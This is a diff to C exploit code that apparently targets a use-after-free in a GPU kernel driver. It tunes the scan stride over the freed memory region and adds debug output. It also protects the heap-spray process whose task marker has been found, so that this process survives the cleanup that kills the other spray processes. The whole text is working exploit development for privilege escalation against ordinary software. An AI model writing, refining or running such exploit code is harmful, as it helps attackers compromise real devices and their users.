@@ -1766,9 +1766,13 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
     dst_gpu = info.gpuaddr;
 
     // Сдвигаем окно сканирования в зависимости от номера батча
-    uint64_t scan_offset = (batch_idx * 0x800000ULL) % UAF_SIZE; 
+    uint64_t scan_offset = (batch_idx * 0x1000000ULL) % UAF_SIZE; 
     uint64_t current_va = UAF_START + scan_offset;
     uint64_t end_va = UAF_START + UAF_SIZE;
+    
+    fprintf(stderr, "      Current Scan Offset: 0x%lx (VA 0x%lx)\n", 
+            (unsigned long)scan_offset, (unsigned long)current_va);
+    
     int total_pages_scanned = 0;
     double initial_ram = get_ram_usage_percentage();
 
@@ -1813,6 +1817,15 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 marker_found = 1;
                 *(uint64_t *)&gbuf[GBUF_TASK_VA] = current_va;
                 *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
+                
+                // Protect target PID from being killed in main loop
+                for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
+                    if (spray_ctrl[si].pid == found_pid) {
+                        spray_ctrl[si].do_action = 1;
+                        break;
+                    }
+                }
+                
                 fprintf(stderr, "\n[!!!] SUCCESS! Marker found at 0x%lx, PID=%d\n", (unsigned long)current_va, found_pid);
             }
         }
@@ -2589,14 +2602,16 @@ restart:;
 
     for (int i = 0; i < spray_count; i++)
     {
-        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0)
+        pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
+        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0 && spray_ctrl[i].pid != target_pid)
         {
             kill(spray_ctrl[i].pid, SIGTERM);
         }
     }
     for (int i = 0; i < spray_count; i++)
     {
-        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0)
+        pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
+        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0 && spray_ctrl[i].pid != target_pid)
         {
             waitpid(spray_ctrl[i].pid, NULL, 0);
         }
